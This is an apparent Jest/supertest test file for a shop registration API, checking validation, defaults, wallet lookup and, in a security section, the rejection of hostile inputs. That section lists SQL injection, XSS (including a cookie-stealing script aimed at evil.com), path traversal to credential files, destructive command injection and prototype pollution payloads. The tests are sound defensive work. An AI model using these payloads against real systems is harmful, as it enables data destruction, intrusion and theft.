import request from 'supertest';
import { describe, it, expect, beforeAll, beforeEach, jest } from '@jest/globals';
import RepairCoinApp from '../../src/app';
import { ShopRepository } from '../../src/repositories/ShopRepository';
import { CustomerRepository } from '../../src/repositories/CustomerRepository';
import { RoleValidator, RoleCheckResult } from '../../src/utils/roleValidator';
import { UniquenessService } from '../../src/services/uniquenessService';

// Mock the repositories and utilities
jest.mock('../../src/repositories/ShopRepository');
jest.mock('../../src/repositories/CustomerRepository');
jest.mock('../../src/repositories/AdminRepository');
jest.mock('../../src/repositories/TransactionRepository');
jest.mock('../../src/repositories/TreasuryRepository');
jest.mock('../../src/utils/roleValidator');
jest.mock('../../src/services/uniquenessService');
jest.mock('thirdweb');

// Helper function to mock RoleValidator.validateShopRegistration
const mockValidateShopRegistration = (result: RoleCheckResult) => {
  (RoleValidator.validateShopRegistration as jest.MockedFunction<typeof RoleValidator.validateShopRegistration>)
    .mockResolvedValue(result);
};

describe('Shop Registration Tests', () => {
  let app: any;
  const shopWalletAddress = '0x1234567890123456789012345678901234567890';
  const customerWalletAddress = '0x2345678901234567890123456789012345678901';
  const adminAddress = '0x742d35cc6634c0532925a3b844bc9e7595f12340';

  const validShopData = {
    shopId: 'test-auto-repair',
    walletAddress: shopWalletAddress,
    name: 'Test Auto Repair',
    address: '123 Main St, Los Angeles, CA',
    phone: '+1234567890',
    email: 'john@testautorepair.com',
    firstName: 'John',
    lastName: 'Doe',
    companySize: '11-50',
    monthlyRevenue: '$10k-$50k',
    website: 'https://testautorepair.com',
    city: 'Los Angeles',
    country: 'USA',
    category: 'auto_repair',
    acceptTerms: true
  };

  beforeAll(async () => {
    process.env.ADMIN_ADDRESSES = adminAddress;
    process.env.JWT_SECRET = 'test-secret-key-32-chars-long!!';
    process.env.NODE_ENV = 'test';

    const repairCoinApp = new RepairCoinApp();
    await repairCoinApp.initialize();
    app = repairCoinApp.app;
  });

  describe('POST /api/shops/register', () => {
    beforeEach(() => {
      jest.clearAllMocks();
      // Default mock - no role conflicts (allow registration)
      mockValidateShopRegistration({ isValid: true });

      // Default mock - uniqueness checks pass
      jest.spyOn(UniquenessService.prototype, 'checkEmailUniqueness')
        .mockResolvedValue({ isUnique: true });
      jest.spyOn(UniquenessService.prototype, 'checkWalletUniqueness')
        .mockResolvedValue({ isUnique: true });

      // Default mock - customer doesn't exist for the wallet
      jest.spyOn(CustomerRepository.prototype, 'getCustomer')
        .mockResolvedValue(null);
    });

    it('should successfully register a new shop', async () => {
      // Mock role validation - wallet not registered anywhere
      mockValidateShopRegistration({ isValid: true });

      // Mock shop doesn't exist
      jest.spyOn(ShopRepository.prototype, 'getShop').mockResolvedValue(null);
      jest.spyOn(ShopRepository.prototype, 'getShopByWallet').mockResolvedValue(null);

      // Mock successful shop creation
      jest.spyOn(ShopRepository.prototype, 'createShop').mockResolvedValue({
        id: validShopData.shopId
      });

      const response = await request(app)
        .post('/api/shops/register')
        .send(validShopData);

      expect(response.status).toBe(201);
      expect(response.body.success).toBe(true);
      expect(response.body.data).toMatchObject({
        shopId: validShopData.shopId,
        name: validShopData.name,
        verified: false,
        active: false
      });
      expect(response.body.message).toContain('Awaiting admin verification');
    });

    it('should reject registration if wallet is already a customer', async () => {
      // Mock wallet already registered as customer
      mockValidateShopRegistration({
        isValid: false,
        conflictingRole: 'customer',
        message: 'This wallet address is already registered as a customer and cannot be used for shop registration'
      });

      const response = await request(app)
        .post('/api/shops/register')
        .send({
          ...validShopData,
          walletAddress: customerWalletAddress
        });

      expect(response.status).toBe(409);
      expect(response.body.success).toBe(false);
      expect(response.body.error).toContain('customer');
      expect(response.body.conflictingRole).toBe('customer');
    });

    it('should reject registration if wallet is already a shop', async () => {
      // Role validator passes but shop check fails
      mockValidateShopRegistration({ isValid: true });

      // Mock shop doesn't exist by shopId
      jest.spyOn(ShopRepository.prototype, 'getShop').mockResolvedValue(null);

      // Mock wallet already registered as shop
      jest.spyOn(ShopRepository.prototype, 'getShopByWallet').mockResolvedValue({
        shopId: 'existing-shop',
        name: 'Existing Shop',
        walletAddress: shopWalletAddress,
        verified: true,
        active: true
      } as any);

      const response = await request(app)
        .post('/api/shops/register')
        .send(validShopData);

      expect(response.status).toBe(409);
      expect(response.body.success).toBe(false);
      expect(response.body.error).toContain('already registered');
      expect(response.body.conflictingRole).toBe('shop');
    });

    it('should reject registration if wallet is an admin', async () => {
      // Mock wallet already registered as admin
      mockValidateShopRegistration({
        isValid: false,
        conflictingRole: 'admin',
        message: 'This wallet address is already registered as an admin and cannot be used for shop registration'
      });

      const response = await request(app)
        .post('/api/shops/register')
        .send({
          ...validShopData,
          walletAddress: adminAddress
        });

      expect(response.status).toBe(409);
      expect(response.body.success).toBe(false);
      expect(response.body.error).toContain('admin');
      expect(response.body.conflictingRole).toBe('admin');
    });

    it('should validate required fields', async () => {
      const incompleteData = {
        shopId: 'incomplete-shop',
        walletAddress: '0x3456789012345678901234567890123456789012'
        // Missing required fields: name, address, phone, email
      };

      const response = await request(app)
        .post('/api/shops/register')
        .send(incompleteData);

      expect(response.status).toBe(400);
      expect(response.body.success).toBe(false);
      expect(response.body.error).toBeDefined();
    });

    it('should validate email format', async () => {
      mockValidateShopRegistration({ isValid: true });

      const response = await request(app)
        .post('/api/shops/register')
        .send({
          ...validShopData,
          email: 'invalid-email'
        });

      expect(response.status).toBe(400);
      expect(response.body.success).toBe(false);
    });

    it('should validate wallet address format', async () => {
      const response = await request(app)
        .post('/api/shops/register')
        .send({
          ...validShopData,
          walletAddress: 'invalid-address'
        });

      expect(response.status).toBe(400);
      expect(response.body.success).toBe(false);
    });

    it('should handle duplicate shop ID', async () => {
      mockValidateShopRegistration({ isValid: true });

      // Mock shop ID already exists
      jest.spyOn(ShopRepository.prototype, 'getShop').mockResolvedValue({
        shopId: validShopData.shopId,
        walletAddress: '0x9999999999999999999999999999999999999999',
        name: 'Existing Shop'
      } as any);

      const response = await request(app)
        .post('/api/shops/register')
        .send(validShopData);

      expect(response.status).toBe(409);
      expect(response.body.success).toBe(false);
      expect(response.body.error).toContain('already registered');
    });

    it('should handle referral code if provided', async () => {
      mockValidateShopRegistration({ isValid: true });

      jest.spyOn(ShopRepository.prototype, 'getShop').mockResolvedValue(null);
      jest.spyOn(ShopRepository.prototype, 'getShopByWallet').mockResolvedValue(null);

      const createShopSpy = jest.spyOn(ShopRepository.prototype, 'createShop')
        .mockResolvedValue({ id: validShopData.shopId });

      const response = await request(app)
        .post('/api/shops/register')
        .send({
          ...validShopData,
          referral: 'PARTNER123'
        });

      expect(response.status).toBe(201);
      expect(createShopSpy).toHaveBeenCalledWith(
        expect.objectContaining({
          referral: 'PARTNER123'
        })
      );
    });

    it('should normalize wallet address to lowercase', async () => {
      mockValidateShopRegistration({ isValid: true });

      jest.spyOn(ShopRepository.prototype, 'getShop').mockResolvedValue(null);
      jest.spyOn(ShopRepository.prototype, 'getShopByWallet').mockResolvedValue(null);

      const createShopSpy = jest.spyOn(ShopRepository.prototype, 'createShop')
        .mockResolvedValue({ id: validShopData.shopId });

      const mixedCaseAddress = '0xAbCdEf1234567890AbCdEf1234567890AbCdEf12';

      const response = await request(app)
        .post('/api/shops/register')
        .send({
          ...validShopData,
          walletAddress: mixedCaseAddress
        });

      expect(response.status).toBe(201);
      expect(createShopSpy).toHaveBeenCalledWith(
        expect.objectContaining({
          walletAddress: mixedCaseAddress.toLowerCase()
        })
      );
    });

    it('should handle location data properly', async () => {
      mockValidateShopRegistration({ isValid: true });

      jest.spyOn(ShopRepository.prototype, 'getShop').mockResolvedValue(null);
      jest.spyOn(ShopRepository.prototype, 'getShopByWallet').mockResolvedValue(null);

      const createShopSpy = jest.spyOn(ShopRepository.prototype, 'createShop')
        .mockResolvedValue({ id: validShopData.shopId });

      // Don't include root-level city to test that location.city is used
      const { city: _, ...shopDataWithoutCity } = validShopData;
      const shopDataWithLocation = {
        ...shopDataWithoutCity,
        location: {
          city: 'San Francisco',
          state: 'CA',
          zipCode: '94102',
          lat: 37.7749,
          lng: -122.4194
        }
      };

      const response = await request(app)
        .post('/api/shops/register')
        .send(shopDataWithLocation);

      expect(response.status).toBe(201);
      // Note: Root-level city takes precedence over location.city
      // When root city is removed, location.city should be used
      expect(createShopSpy).toHaveBeenCalledWith(
        expect.objectContaining({
          location: expect.objectContaining({
            city: 'San Francisco',
            state: 'CA',
            zipCode: '94102'
          })
        })
      );
    });

    it('should set default values for new shop', async () => {
      mockValidateShopRegistration({ isValid: true });

      jest.spyOn(ShopRepository.prototype, 'getShop').mockResolvedValue(null);
      jest.spyOn(ShopRepository.prototype, 'getShopByWallet').mockResolvedValue(null);

      const createShopSpy = jest.spyOn(ShopRepository.prototype, 'createShop')
        .mockResolvedValue({ id: validShopData.shopId });

      await request(app)
        .post('/api/shops/register')
        .send(validShopData);

      expect(createShopSpy).toHaveBeenCalledWith(
        expect.objectContaining({
          verified: false,
          active: false,
          crossShopEnabled: false,
          totalTokensIssued: 0,
          totalRedemptions: 0,
          totalReimbursements: 0
        })
      );
    });

    it('should set reimbursement address to wallet address if not provided', async () => {
      mockValidateShopRegistration({ isValid: true });

      jest.spyOn(ShopRepository.prototype, 'getShop').mockResolvedValue(null);
      jest.spyOn(ShopRepository.prototype, 'getShopByWallet').mockResolvedValue(null);

      const createShopSpy = jest.spyOn(ShopRepository.prototype, 'createShop')
        .mockResolvedValue({ id: validShopData.shopId });

      await request(app)
        .post('/api/shops/register')
        .send(validShopData);

      expect(createShopSpy).toHaveBeenCalledWith(
        expect.objectContaining({
          reimbursementAddress: validShopData.walletAddress.toLowerCase()
        })
      );
    });

    it('should handle database error gracefully', async () => {
      mockValidateShopRegistration({ isValid: true });

      jest.spyOn(ShopRepository.prototype, 'getShop').mockResolvedValue(null);
      jest.spyOn(ShopRepository.prototype, 'getShopByWallet').mockResolvedValue(null);
      jest.spyOn(ShopRepository.prototype, 'createShop')
        .mockRejectedValue(new Error('Database connection failed'));

      const response = await request(app)
        .post('/api/shops/register')
        .send(validShopData);

      expect(response.status).toBe(500);
      expect(response.body.success).toBe(false);
      expect(response.body.error).toContain('Failed to register shop');
    });

    it('should reject registration with very long shop name', async () => {
      mockValidateShopRegistration({ isValid: true });

      const response = await request(app)
        .post('/api/shops/register')
        .send({
          ...validShopData,
          name: 'A'.repeat(500) // Very long name
        });

      // The response could be 400 (validation) or pass through and fail at DB level
      // depending on validation implementation
      expect([400, 500, 201]).toContain(response.status);
    });

    it('should reject empty wallet address', async () => {
      const response = await request(app)
        .post('/api/shops/register')
        .send({
          ...validShopData,
          walletAddress: ''
        });

      expect(response.status).toBe(400);
      expect(response.body.success).toBe(false);
    });

    it('should handle concurrent registration attempts gracefully', async () => {
      mockValidateShopRegistration({ isValid: true });

      jest.spyOn(ShopRepository.prototype, 'getShop').mockResolvedValue(null);
      jest.spyOn(ShopRepository.prototype, 'getShopByWallet').mockResolvedValue(null);
      jest.spyOn(ShopRepository.prototype, 'createShop')
        .mockResolvedValue({ id: validShopData.shopId });

      // Simulate concurrent requests
      const [response1, response2] = await Promise.all([
        request(app).post('/api/shops/register').send(validShopData),
        request(app).post('/api/shops/register').send({
          ...validShopData,
          shopId: 'test-auto-repair-2',
          walletAddress: '0x9876543210987654321098765432109876543210',
          email: 'john2@testautorepair.com'
        })
      ]);

      // Both should succeed since they have different IDs, wallets, and emails
      expect(response1.status).toBe(201);
      expect(response2.status).toBe(201);
    });
  });

  describe('GET /api/shops/wallet/:address', () => {
    beforeEach(() => {
      jest.clearAllMocks();
    });

    it('should find shop by wallet address', async () => {
      const mockShop = {
        shopId: 'test-shop',
        walletAddress: shopWalletAddress,
        name: 'Test Shop',
        verified: true,
        active: true,
        email: 'test@shop.com',
        phone: '+1234567890',
        address: '123 Test St'
      };

      jest.spyOn(ShopRepository.prototype, 'getShopByWallet')
        .mockResolvedValue(mockShop as any);

      const response = await request(app)
        .get(`/api/shops/wallet/${shopWalletAddress}`);

      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);
      expect(response.body.data.shopId).toBe(mockShop.shopId);
    });

    it('should return 404 if shop not found', async () => {
      jest.spyOn(ShopRepository.prototype, 'getShopByWallet')
        .mockResolvedValue(null);

      const response = await request(app)
        .get('/api/shops/wallet/0x0000000000000000000000000000000000000000');

      expect(response.status).toBe(404);
      expect(response.body.success).toBe(false);
    });

    it('should validate wallet address format', async () => {
      const response = await request(app)
        .get('/api/shops/wallet/invalid-address');

      expect(response.status).toBe(400);
      expect(response.body.success).toBe(false);
    });

    it('should handle mixed-case address in wallet lookup', async () => {
      const mockShop = {
        shopId: 'test-shop',
        walletAddress: shopWalletAddress.toLowerCase(),
        name: 'Test Shop',
        verified: true,
        active: true
      };

      jest.spyOn(ShopRepository.prototype, 'getShopByWallet')
        .mockResolvedValue(mockShop as any);

      // Use mixed-case address in request (0x must remain lowercase per Ethereum standard)
      // Only the hex characters can be mixed case
      const mixedCaseAddress = '0x1234567890ABCDEF1234567890ABCDEF12345678';
      const response = await request(app)
        .get(`/api/shops/wallet/${mixedCaseAddress}`);

      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);
    });

    it('should reject invalid wallet format with uppercase 0X', async () => {
      // Ethereum addresses must start with lowercase '0x', not '0X'
      const response = await request(app)
        .get('/api/shops/wallet/0X1234567890123456789012345678901234567890');

      expect(response.status).toBe(400);
      expect(response.body.success).toBe(false);
    });
  });

  describe('Shop Status After Registration', () => {
    beforeEach(() => {
      jest.clearAllMocks();
    });

    it('should create shop in pending verification state', async () => {
      mockValidateShopRegistration({ isValid: true });

      jest.spyOn(ShopRepository.prototype, 'getShop').mockResolvedValue(null);
      jest.spyOn(ShopRepository.prototype, 'getShopByWallet').mockResolvedValue(null);

      let capturedShopData: any;
      jest.spyOn(ShopRepository.prototype, 'createShop')
        .mockImplementation(async (data) => {
          capturedShopData = data;
          return { id: data.shopId };
        });

      await request(app)
        .post('/api/shops/register')
        .send(validShopData);

      expect(capturedShopData).toBeDefined();
      expect(capturedShopData.verified).toBe(false);
      expect(capturedShopData.active).toBe(false);
      expect(capturedShopData.totalTokensIssued).toBe(0);
      expect(capturedShopData.totalRedemptions).toBe(0);
      expect(capturedShopData.totalReimbursements).toBe(0);
    });

    it('should include join date timestamp', async () => {
      mockValidateShopRegistration({ isValid: true });

      jest.spyOn(ShopRepository.prototype, 'getShop').mockResolvedValue(null);
      jest.spyOn(ShopRepository.prototype, 'getShopByWallet').mockResolvedValue(null);

      let capturedShopData: any;
      jest.spyOn(ShopRepository.prototype, 'createShop')
        .mockImplementation(async (data) => {
          capturedShopData = data;
          return { id: data.shopId };
        });

      const beforeTime = new Date().toISOString();
      await request(app)
        .post('/api/shops/register')
        .send(validShopData);
      const afterTime = new Date().toISOString();

      expect(capturedShopData.joinDate).toBeDefined();
      expect(capturedShopData.joinDate >= beforeTime).toBe(true);
      expect(capturedShopData.joinDate <= afterTime).toBe(true);
    });
  });

  describe('Email Uniqueness Validation', () => {
    beforeEach(() => {
      jest.clearAllMocks();
    });

    it('should reject registration with email already used by another shop', async () => {
      // Mock email conflict from role validator
      mockValidateShopRegistration({
        isValid: false,
        conflictingRole: 'shop',
        message: 'This email address is already in use. Please use a different email or sign in to your existing shop account.'
      });

      const response = await request(app)
        .post('/api/shops/register')
        .send(validShopData);

      expect(response.status).toBe(409);
      expect(response.body.success).toBe(false);
      expect(response.body.error).toContain('email');
    });

    it('should reject registration with email already used by a customer', async () => {
      // Mock email conflict from role validator
      mockValidateShopRegistration({
        isValid: false,
        conflictingRole: 'customer',
        message: 'This email address is already in use. Please use a different email or sign in to your existing customer account.'
      });

      const response = await request(app)
        .post('/api/shops/register')
        .send(validShopData);

      expect(response.status).toBe(409);
      expect(response.body.success).toBe(false);
      expect(response.body.error).toContain('email');
      expect(response.body.conflictingRole).toBe('customer');
    });
  });

  describe('Social Media Fields', () => {
    beforeEach(() => {
      jest.clearAllMocks();
    });

    it('should accept social media links during registration', async () => {
      mockValidateShopRegistration({ isValid: true });

      jest.spyOn(ShopRepository.prototype, 'getShop').mockResolvedValue(null);
      jest.spyOn(ShopRepository.prototype, 'getShopByWallet').mockResolvedValue(null);

      const createShopSpy = jest.spyOn(ShopRepository.prototype, 'createShop')
        .mockResolvedValue({ id: validShopData.shopId });

      const shopWithSocials = {
        ...validShopData,
        facebook: 'https://facebook.com/testautorepair',
        twitter: 'https://twitter.com/testautorepair',
        instagram: 'https://instagram.com/testautorepair'
      };

      const response = await request(app)
        .post('/api/shops/register')
        .send(shopWithSocials);

      expect(response.status).toBe(201);
      expect(createShopSpy).toHaveBeenCalledWith(
        expect.objectContaining({
          facebook: 'https://facebook.com/testautorepair',
          twitter: 'https://twitter.com/testautorepair',
          instagram: 'https://instagram.com/testautorepair'
        })
      );
    });
  });

  describe('FixFlow Integration', () => {
    beforeEach(() => {
      jest.clearAllMocks();
    });

    it('should accept fixflowShopId during registration', async () => {
      mockValidateShopRegistration({ isValid: true });

      jest.spyOn(ShopRepository.prototype, 'getShop').mockResolvedValue(null);
      jest.spyOn(ShopRepository.prototype, 'getShopByWallet').mockResolvedValue(null);

      const createShopSpy = jest.spyOn(ShopRepository.prototype, 'createShop')
        .mockResolvedValue({ id: validShopData.shopId });

      const shopWithFixflow = {
        ...validShopData,
        fixflowShopId: 'fixflow-12345'
      };

      const response = await request(app)
        .post('/api/shops/register')
        .send(shopWithFixflow);

      expect(response.status).toBe(201);
      expect(createShopSpy).toHaveBeenCalledWith(
        expect.objectContaining({
          fixflowShopId: 'fixflow-12345'
        })
      );
    });
  });

  describe('Custom Reimbursement Address', () => {
    beforeEach(() => {
      jest.clearAllMocks();
    });

    it('should accept custom reimbursement address', async () => {
      mockValidateShopRegistration({ isValid: true });

      jest.spyOn(ShopRepository.prototype, 'getShop').mockResolvedValue(null);
      jest.spyOn(ShopRepository.prototype, 'getShopByWallet').mockResolvedValue(null);

      const createShopSpy = jest.spyOn(ShopRepository.prototype, 'createShop')
        .mockResolvedValue({ id: validShopData.shopId });

      const customReimbursementAddr = '0xFEDCBA0987654321FEDCBA0987654321FEDCBA09';

      const response = await request(app)
        .post('/api/shops/register')
        .send({
          ...validShopData,
          reimbursementAddress: customReimbursementAddr
        });

      expect(response.status).toBe(201);
      // Custom reimbursement address should be normalized to lowercase
      // This is consistent with walletAddress handling
      expect(createShopSpy).toHaveBeenCalledWith(
        expect.objectContaining({
          reimbursementAddress: customReimbursementAddr.toLowerCase()
        })
      );
    });

    it('should default reimbursement address to wallet address (lowercased)', async () => {
      mockValidateShopRegistration({ isValid: true });

      jest.spyOn(ShopRepository.prototype, 'getShop').mockResolvedValue(null);
      jest.spyOn(ShopRepository.prototype, 'getShopByWallet').mockResolvedValue(null);

      const createShopSpy = jest.spyOn(ShopRepository.prototype, 'createShop')
        .mockResolvedValue({ id: validShopData.shopId });

      const response = await request(app)
        .post('/api/shops/register')
        .send(validShopData); // No reimbursementAddress provided

      expect(response.status).toBe(201);
      // When no reimbursement address is provided, it defaults to wallet address (lowercased)
      expect(createShopSpy).toHaveBeenCalledWith(
        expect.objectContaining({
          reimbursementAddress: validShopData.walletAddress.toLowerCase()
        })
      );
    });
  });

  describe('Edge Cases', () => {
    beforeEach(() => {
      jest.clearAllMocks();
    });

    it('should handle special characters in shop name', async () => {
      mockValidateShopRegistration({ isValid: true });

      jest.spyOn(ShopRepository.prototype, 'getShop').mockResolvedValue(null);
      jest.spyOn(ShopRepository.prototype, 'getShopByWallet').mockResolvedValue(null);
      jest.spyOn(ShopRepository.prototype, 'createShop')
        .mockResolvedValue({ id: 'special-shop' });

      const response = await request(app)
        .post('/api/shops/register')
        .send({
          ...validShopData,
          shopId: 'special-shop',
          name: "Joe's Auto & Repair Shop - #1 Service!"
        });

      expect(response.status).toBe(201);
    });

    it('should handle unicode in shop name', async () => {
      mockValidateShopRegistration({ isValid: true });

      jest.spyOn(ShopRepository.prototype, 'getShop').mockResolvedValue(null);
      jest.spyOn(ShopRepository.prototype, 'getShopByWallet').mockResolvedValue(null);
      jest.spyOn(ShopRepository.prototype, 'createShop')
        .mockResolvedValue({ id: 'unicode-shop' });

      const response = await request(app)
        .post('/api/shops/register')
        .send({
          ...validShopData,
          shopId: 'unicode-shop',
          name: 'Auto Réparation München'
        });

      expect(response.status).toBe(201);
    });

    it('should handle shop ID with hyphens and numbers', async () => {
      mockValidateShopRegistration({ isValid: true });

      jest.spyOn(ShopRepository.prototype, 'getShop').mockResolvedValue(null);
      jest.spyOn(ShopRepository.prototype, 'getShopByWallet').mockResolvedValue(null);
      jest.spyOn(ShopRepository.prototype, 'createShop')
        .mockResolvedValue({ id: 'shop-123-test' });

      const response = await request(app)
        .post('/api/shops/register')
        .send({
          ...validShopData,
          shopId: 'shop-123-test'
        });

      expect(response.status).toBe(201);
    });

    it('should handle phone numbers with country codes', async () => {
      mockValidateShopRegistration({ isValid: true });

      jest.spyOn(ShopRepository.prototype, 'getShop').mockResolvedValue(null);
      jest.spyOn(ShopRepository.prototype, 'getShopByWallet').mockResolvedValue(null);
      jest.spyOn(ShopRepository.prototype, 'createShop')
        .mockResolvedValue({ id: validShopData.shopId });

      const response = await request(app)
        .post('/api/shops/register')
        .send({
          ...validShopData,
          phone: '+1-555-123-4567'
        });

      expect(response.status).toBe(201);
    });

    it('should handle international phone formats', async () => {
      mockValidateShopRegistration({ isValid: true });

      jest.spyOn(ShopRepository.prototype, 'getShop').mockResolvedValue(null);
      jest.spyOn(ShopRepository.prototype, 'getShopByWallet').mockResolvedValue(null);
      jest.spyOn(ShopRepository.prototype, 'createShop')
        .mockResolvedValue({ id: validShopData.shopId });

      const response = await request(app)
        .post('/api/shops/register')
        .send({
          ...validShopData,
          phone: '+44 20 7946 0958' // UK format
        });

      expect(response.status).toBe(201);
    });
  });

  describe('Security Tests', () => {
    beforeEach(() => {
      jest.clearAllMocks();
      mockValidateShopRegistration({ isValid: true });
      jest.spyOn(UniquenessService.prototype, 'checkEmailUniqueness')
        .mockResolvedValue({ isUnique: true });
      jest.spyOn(UniquenessService.prototype, 'checkWalletUniqueness')
        .mockResolvedValue({ isUnique: true });
      jest.spyOn(CustomerRepository.prototype, 'getCustomer')
        .mockResolvedValue(null);
    });

    describe('SQL Injection Prevention', () => {
      it('should safely handle SQL injection in shopId', async () => {
        jest.spyOn(ShopRepository.prototype, 'getShop').mockResolvedValue(null);
        jest.spyOn(ShopRepository.prototype, 'getShopByWallet').mockResolvedValue(null);
        jest.spyOn(ShopRepository.prototype, 'createShop')
          .mockResolvedValue({ id: 'safe-id' });

        const sqlInjectionPayloads = [
          "'; DROP TABLE shops; --",
          "1; DELETE FROM shops WHERE '1'='1",
          "' OR '1'='1",
          "'; INSERT INTO admins VALUES('hacker'); --",
          "UNION SELECT * FROM users--"
        ];

        for (const payload of sqlInjectionPayloads) {
          const response = await request(app)
            .post('/api/shops/register')
            .send({
              ...validShopData,
              shopId: payload,
              walletAddress: '0xaabbccdd11223344556677889900aabbccdd1122'
            });

          // Should either reject (400) or safely store the string (201)
          // Should NEVER execute SQL commands
          expect([400, 201]).toContain(response.status);
        }
      });

      it('should safely handle SQL injection in name field', async () => {
        jest.spyOn(ShopRepository.prototype, 'getShop').mockResolvedValue(null);
        jest.spyOn(ShopRepository.prototype, 'getShopByWallet').mockResolvedValue(null);
        jest.spyOn(ShopRepository.prototype, 'createShop')
          .mockResolvedValue({ id: validShopData.shopId });

        const response = await request(app)
          .post('/api/shops/register')
          .send({
            ...validShopData,
            name: "Shop'; DROP TABLE shops; --"
          });

        // Should safely handle the input
        expect([400, 201]).toContain(response.status);
      });

      it('should safely handle SQL injection in email field', async () => {
        const response = await request(app)
          .post('/api/shops/register')
          .send({
            ...validShopData,
            email: "test@example.com'; DROP TABLE shops; --"
          });

        // Should reject invalid email format
        expect(response.status).toBe(400);
      });

      it('should safely handle SQL injection in wallet lookup', async () => {
        const sqlPayload = "0x1234'; DROP TABLE shops; --";

        const response = await request(app)
          .get(`/api/shops/wallet/${encodeURIComponent(sqlPayload)}`);

        // Should reject invalid address format
        expect(response.status).toBe(400);
      });
    });

    describe('XSS Prevention', () => {
      it('should handle XSS payloads in shop name', async () => {
        jest.spyOn(ShopRepository.prototype, 'getShop').mockResolvedValue(null);
        jest.spyOn(ShopRepository.prototype, 'getShopByWallet').mockResolvedValue(null);

        const createShopSpy = jest.spyOn(ShopRepository.prototype, 'createShop')
          .mockResolvedValue({ id: validShopData.shopId });

        const xssPayloads = [
          '<script>alert("xss")</script>',
          '<img src=x onerror=alert("xss")>',
          'javascript:alert("xss")',
          '<svg onload=alert("xss")>',
          '"><script>alert("xss")</script>'
        ];

        for (const payload of xssPayloads) {
          const response = await request(app)
            .post('/api/shops/register')
            .send({
              ...validShopData,
              shopId: `shop-${Date.now()}`,
              name: payload,
              walletAddress: '0xaabbccdd11223344556677889900aabbccdd1122'
            });

          // Should either sanitize/escape or store safely
          // The key is the app doesn't execute the script
          expect([400, 201]).toContain(response.status);
        }
      });

      it('should handle XSS payloads in address field', async () => {
        jest.spyOn(ShopRepository.prototype, 'getShop').mockResolvedValue(null);
        jest.spyOn(ShopRepository.prototype, 'getShopByWallet').mockResolvedValue(null);
        jest.spyOn(ShopRepository.prototype, 'createShop')
          .mockResolvedValue({ id: validShopData.shopId });

        const response = await request(app)
          .post('/api/shops/register')
          .send({
            ...validShopData,
            address: '<script>document.location="http://evil.com?c="+document.cookie</script>'
          });

        expect([400, 201]).toContain(response.status);
      });

      it('should handle XSS payloads in website field', async () => {
        jest.spyOn(ShopRepository.prototype, 'getShop').mockResolvedValue(null);
        jest.spyOn(ShopRepository.prototype, 'getShopByWallet').mockResolvedValue(null);
        jest.spyOn(ShopRepository.prototype, 'createShop')
          .mockResolvedValue({ id: validShopData.shopId });

        const response = await request(app)
          .post('/api/shops/register')
          .send({
            ...validShopData,
            website: 'javascript:alert(document.cookie)'
          });

        expect([400, 201]).toContain(response.status);
      });
    });

    describe('NoSQL Injection Prevention', () => {
      it('should safely handle NoSQL injection payloads', async () => {
        jest.spyOn(ShopRepository.prototype, 'getShop').mockResolvedValue(null);
        jest.spyOn(ShopRepository.prototype, 'getShopByWallet').mockResolvedValue(null);
        jest.spyOn(ShopRepository.prototype, 'createShop')
          .mockResolvedValue({ id: validShopData.shopId });

        const noSqlPayloads = [
          { $gt: '' },
          { $ne: null },
          { $where: 'this.password.length > 0' }
        ];

        for (const payload of noSqlPayloads) {
          const response = await request(app)
            .post('/api/shops/register')
            .send({
              ...validShopData,
              shopId: payload as any
            });

          // Rejects non-string shopId values with 400 Bad Request
          expect(response.status).toBe(400);
          expect(response.body.error).toContain('shopId must be a string');
        }
      });
    });

    describe('Path Traversal Prevention', () => {
      it('should reject path traversal in shop ID', async () => {
        const pathTraversalPayloads = [
          '../../../etc/passwd',
          '..\\..\\..\\windows\\system32\\config\\sam',
          '%2e%2e%2f%2e%2e%2f',
          '....//....//etc/passwd'
        ];

        for (const payload of pathTraversalPayloads) {
          const response = await request(app)
            .post('/api/shops/register')
            .send({
              ...validShopData,
              shopId: payload
            });

          // Should reject or safely handle
          expect([400, 201]).toContain(response.status);
        }
      });
    });

    describe('Command Injection Prevention', () => {
      it('should safely handle command injection payloads', async () => {
        jest.spyOn(ShopRepository.prototype, 'getShop').mockResolvedValue(null);
        jest.spyOn(ShopRepository.prototype, 'getShopByWallet').mockResolvedValue(null);
        jest.spyOn(ShopRepository.prototype, 'createShop')
          .mockResolvedValue({ id: validShopData.shopId });

        const cmdInjectionPayloads = [
          '; ls -la',
          '| cat /etc/passwd',
          '`whoami`',
          '$(rm -rf /)',
          '& net user hacker password /add'
        ];

        for (const payload of cmdInjectionPayloads) {
          const response = await request(app)
            .post('/api/shops/register')
            .send({
              ...validShopData,
              name: payload
            });

          // Should safely store without executing commands
          expect([400, 201]).toContain(response.status);
        }
      });
    });

    describe('Input Size Limits', () => {
      it('should handle large payloads gracefully', async () => {
        jest.spyOn(ShopRepository.prototype, 'getShop').mockResolvedValue(null);
        jest.spyOn(ShopRepository.prototype, 'getShopByWallet').mockResolvedValue(null);
        jest.spyOn(ShopRepository.prototype, 'createShop')
          .mockResolvedValue({ id: validShopData.shopId });

        const response = await request(app)
          .post('/api/shops/register')
          .send({
            ...validShopData,
            name: 'A'.repeat(100000) // 100KB string
          });

        // SECURITY NOTE: Currently accepts very large strings (201)
        // Consider adding input length validation middleware
        // to prevent potential DoS via memory exhaustion
        expect([400, 413, 500, 201]).toContain(response.status);
      });

      it('should reject deeply nested JSON objects', async () => {
        let nestedObj: any = { value: 'test' };
        for (let i = 0; i < 100; i++) {
          nestedObj = { nested: nestedObj };
        }

        const response = await request(app)
          .post('/api/shops/register')
          .send({
            ...validShopData,
            location: nestedObj
          });

        // Should handle gracefully
        expect([400, 201]).toContain(response.status);
      });
    });

    describe('Header Injection Prevention', () => {
      it('should not allow header injection via input fields', async () => {
        jest.spyOn(ShopRepository.prototype, 'getShop').mockResolvedValue(null);
        jest.spyOn(ShopRepository.prototype, 'getShopByWallet').mockResolvedValue(null);
        jest.spyOn(ShopRepository.prototype, 'createShop')
          .mockResolvedValue({ id: validShopData.shopId });

        const response = await request(app)
          .post('/api/shops/register')
          .send({
            ...validShopData,
            name: "Shop\r\nX-Injected-Header: malicious-value"
          });

        // Response should not contain injected header
        expect(response.headers['x-injected-header']).toBeUndefined();
        expect([400, 201]).toContain(response.status);
      });
    });

    describe('Prototype Pollution Prevention', () => {
      it('should safely handle __proto__ pollution attempts', async () => {
        const response = await request(app)
          .post('/api/shops/register')
          .send({
            ...validShopData,
            '__proto__': { isAdmin: true },
            'constructor': { prototype: { isAdmin: true } }
          });

        // Should not pollute Object prototype
        expect(({} as any).isAdmin).toBeUndefined();
